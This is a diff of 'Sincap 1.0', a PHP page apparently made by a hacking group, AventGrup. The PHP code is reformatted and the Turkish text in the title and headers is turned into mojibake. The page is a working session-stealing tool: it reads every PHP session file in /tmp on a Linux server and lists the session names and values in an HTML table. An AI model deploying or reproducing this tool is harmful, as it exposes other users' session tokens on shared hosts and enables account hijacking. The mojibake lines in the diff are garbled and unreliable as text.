@@ -1,11 +1,10 @@
 <html>
-
 <head>
 <meta http-equiv="Content-Language" content="tr">
 <meta name="GENERATOR" content="Microsoft FrontPage 6.0">
 <meta name="ProgId" content="FrontPage.Editor.Document">
 <meta http-equiv="Content-Type" content="text/html; charset=windows-1254">
-<title>:: AventGrup ::.. - Sincap 1.0 | Session(Oturum) Böceği&nbsp;&nbsp; </title>
+<title>:: AventGrup ::.. - Sincap 1.0 | Session(Oturum) Bï¿½ceï¿½i&nbsp;&nbsp; </title>
 </head>
 
 <body text="#008000" bgcolor="#808080" topmargin="0" leftmargin="0" rightmargin="0" bottommargin="0" marginwidth="0" marginheight="0">
@@ -19,8 +18,8 @@
     <font face="Verdana" style="font-size: 8pt" color="#B7B7B7">
     <span style="font-weight: 700">
     <br>
-    AventGrup©<br>
-    </span>Avrasya Veri ve NetWork Teknolojileri Geliştirme Grubu<br>
+    AventGrupï¿½<br>
+    </span>Avrasya Veri ve NetWork Teknolojileri Geliï¿½tirme Grubu<br>
     <span style="font-weight: 700">
     <br>
     Sincap 1.0</span></font></td>
@@ -37,7 +36,7 @@
 	<tr>
     <td width="1002" bgcolor="#484848" height="25" colspan="3">
     <font color="#E5E5E5" style="font-size: 8pt; font-weight: 700" face="Arial">&nbsp; 
-	Linux Sessin ( Oturum ) Böceği</font></td>
+	Linux Sessin ( Oturum ) Bï¿½ceï¿½i</font></td>
     </tr>
 </table>
 
@@ -48,77 +47,73 @@
     No</font></td>
     <td width="25%" bgcolor="#B6B6B6">
     <font face="Verdana" style="font-size: 8pt; font-weight: 700" color="#000000">&nbsp;Oturum 
-    Adı</font></td>
+    Adï¿½</font></td>
     <td width="42%" bgcolor="#B6B6B6">
     <font face="Verdana" style="font-size: 8pt; font-weight: 700" color="#000000">&nbsp;Oturum 
-    Değeri</font></td>
+    Deï¿½eri</font></td>
     <td width="25%" bgcolor="#B6B6B6">
     <font face="Verdana" style="font-size: 8pt; font-weight: 700" color="#000000">&nbsp;Referans</font></td>
   </tr>
 <tr>
 
+<?php
+$toplam = '';
+if ($sedat = @opendir('/tmp')) {
+    while (($ekinci = readdir($sedat))) {
+        if (!is_file("/tmp/$ekinci") || !($ekinci > 'sess_')) {
+            continue;
+        }
 
-<?
-if ($sedat=@opendir("/tmp")){
-while (($ekinci=readdir ($sedat))){
-if (is_file("/tmp/$ekinci")){
-if($ekinci>"sess_"){
-$asortik=$ekinci;
-$baglan=fopen("/tmp/$ekinci",'r');
-while(! feof ( $baglan ) ){
-$okunan=fgets($baglan,1024);
-$toplam="$toplam$okunan";
-} fclose($baglan); 
-};
-?>
+        $asortik = $ekinci;
+        $baglan = fopen("/tmp/$ekinci", 'r');
 
+        while (!feof($baglan)) {
+            $okunan = fgets($baglan, 1024);
+            $toplam = "$toplam$okunan";
+        }
 
-
-<?
-}}}
+        fclose($baglan);
+    }
+}
 closedir($sedat);
 ?>
 
-<?
-$metin=$toplam;
-$i=explode(";",$metin);
-?>
+<?php
+$metin = $toplam;
+$i = explode(';', $metin);
+$is = 0;
 
+foreach ($i as $yeni) {
+    $tampon = explode('|', $yeni);
+    $deger1 = "$tampon[0]";
+    $ich = explode(':', $tampon[1]);
+    $tampon3 = count($ich);
+    $tampon4 = $tampon3 - 1;
+    $deger2 = "$ich[$tampon4]";
+    ++$is;
 
-
-
-<?
-foreach($i as $yeni){
-$tampon=explode("|",$yeni);
-$deger1= "$tampon[0]";
-$ich=explode(":",$tampon[1]);
-$tampon3=count($ich);
-$tampon4=$tampon3-1;
-$deger2= "$ich[$tampon4]";
-$is++;
-$temizleme=array(
-'"'=>'',
-'v'=>'',
-'c'=>''
-);
-$degerT= strtr($deger2,$temizleme);
-?>
+    $temizleme = [
+        '"' => '',
+        'v' => '',
+        'c' => '',
+    ];
+    $degerT = strtr($deger2, $temizleme); ?>
     <td width="8%" bgcolor="#E5E5E5" align="left" valign="top">
-    <font face="Verdana" style="font-size: 8pt" color="#000000">&nbsp;<?echo $is;?></font></td>
+    <font face="Verdana" style="font-size: 8pt" color="#000000">&nbsp;<?php echo $is; ?></font></td>
     <td width="25%" bgcolor="#E5E5E5" align="left" valign="top">
-    <font face="Verdana" style="font-size: 8pt" color="#000000">&nbsp;<?echo $deger1;?></font></td>
+    <font face="Verdana" style="font-size: 8pt" color="#000000">&nbsp;<?php echo $deger1; ?></font></td>
     <td width="42%" bgcolor="#E5E5E5" align="left" valign="top">
-    <font face="Verdana" style="font-size: 8pt" color="#000000">&nbsp;<?echo $degerT;?></font></td>
+    <font face="Verdana" style="font-size: 8pt" color="#000000">&nbsp;<?php echo $degerT; ?></font></td>
     <td width="25%" bgcolor="#E5E5E5" align="left" valign="top">
     <font face="Verdana" style="font-size: 8pt" color="#000000">&nbsp;-</td>
 
 </tr>
-<?};?>
+<?php
+}
+?>
 
 </table>
 
 </body>
 
 </html>
-
-
